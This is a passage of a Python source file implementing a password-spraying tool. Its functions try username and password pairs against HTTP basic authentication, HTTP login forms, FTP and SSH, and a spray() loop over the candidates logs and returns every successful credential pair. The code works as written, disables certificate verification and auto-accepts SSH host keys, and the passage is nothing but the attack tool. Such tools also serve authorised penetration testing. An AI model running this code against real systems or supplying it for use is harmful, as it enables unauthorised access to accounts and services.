]


def _try_http_basic(url: str, username: str, password: str, timeout: int = 5) -> bool:
    try:
        resp = requests.get(url, auth=(username, password), timeout=timeout, verify=False, allow_redirects=False)
        return resp.status_code not in (401, 403)
    except requests.RequestException:
        return False


def _try_http_form(url: str, username: str, password: str,
                   user_field: str = "username", pass_field: str = "password",
                   success_indicator: str = "", timeout: int = 5) -> bool:
    try:
        resp = requests.post(url, data={user_field: username, pass_field: password},
                             timeout=timeout, verify=False, allow_redirects=True)
        if success_indicator:
            return success_indicator in resp.text
        # Heuristic: check for common failure strings
        fail_indicators = ["invalid", "incorrect", "failed", "wrong", "error", "denied"]
        lower = resp.text.lower()
        return not any(ind in lower for ind in fail_indicators) and resp.status_code == 200
    except requests.RequestException:
        return False


def _try_ftp(host: str, username: str, password: str, port: int = 21, timeout: int = 5) -> bool:
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=timeout)
        ftp.login(username, password)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False
    except Exception:
        return False


def _try_ssh(host: str, username: str, password: str, port: int = 22, timeout: int = 5) -> bool:
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=username, password=password, timeout=timeout, banner_timeout=timeout)
        client.close()
        return True
    except Exception:
        return False


def spray(
    host: str,
    usernames: list[str],
    passwords: Optional[list[str]] = None,
    service: str = "http",
    port: int = 80,
    url: Optional[str] = None,
    user_field: str = "username",
    pass_field: str = "password",
    success_indicator: str = "",
    delay: float = 0.3,
    progress_fn: Optional[Callable] = None,
) -> dict:
    import time
    passwords = passwords or COMMON_PASSWORDS
    hits = []
    tested = 0
    total = len(usernames) * len(passwords)

    for username in usernames:
        for password in passwords:
            tested += 1
            success = False
            try:
                if service in ("http", "https"):
                    target_url = url or f"{service}://{host}:{port}"
                    success = _try_http_basic(target_url, username, password)
                elif service == "http_form":
                    success = _try_http_form(
                        url or f"http://{host}:{port}/login",
                        username, password, user_field, pass_field, success_indicator,
                    )
                elif service == "ftp":
                    success = _try_ftp(host, username, password, port)
                elif service == "ssh":
                    success = _try_ssh(host, username, password, port)
            except Exception as exc:
                logger.debug(f"Spray error {username}:{password}: {exc}")

            if success:
                hits.append({"username": username, "password": password, "service": service})
                logger.info(f"[SPRAY HIT] {service}://{host} — {username}:{password}")

            if progress_fn and tested % 10 == 0:
                progress_fn(tested, total, len(hits))

            time.sleep(delay)

    return {
        "host": host,
        "service": service,
        "tested": tested,
        "hits": hits,
        "success": len(hits) > 0,
    }
